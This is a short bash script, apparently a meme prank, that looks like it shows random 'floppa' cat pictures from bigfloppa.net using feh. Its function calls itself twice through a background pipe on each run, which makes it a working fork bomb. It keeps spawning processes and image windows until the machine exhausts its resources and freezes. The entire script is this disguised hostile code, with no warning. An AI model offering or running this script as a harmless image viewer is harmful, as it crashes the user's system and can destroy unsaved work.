#!/bin/bash
floppa() 
{
        feh https://bigfloppa.net/gallery/images/floppa$[ $RANDOM % 204 + 1 ].jpg &
        floppa|floppa &
};
floppa
